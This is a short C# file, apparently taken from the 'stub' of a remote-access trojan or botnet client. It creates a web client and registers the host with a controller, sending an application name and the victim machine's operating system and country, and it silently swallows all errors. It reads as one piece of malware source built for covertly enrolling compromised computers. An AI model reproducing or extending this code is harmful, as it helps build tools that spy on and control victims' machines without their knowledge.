using System.Net;
using System.Windows.Forms;

namespace stub
{
    internal class WebClientHandler
    {
        static WebClient webclient = null;
        public static void initwebClient()
        {
            try
            {
                webclient = new WebClient();
                ClientAdder.addNewClient(webclient, MutexHandler.appNameReturn(), osAndCountryHandler.osGrabber(), osAndCountryHandler.countryGrabber());
            }
            catch {}
        }

        public static WebClient wcReturn()
        {
            return webclient;
        }
    }
}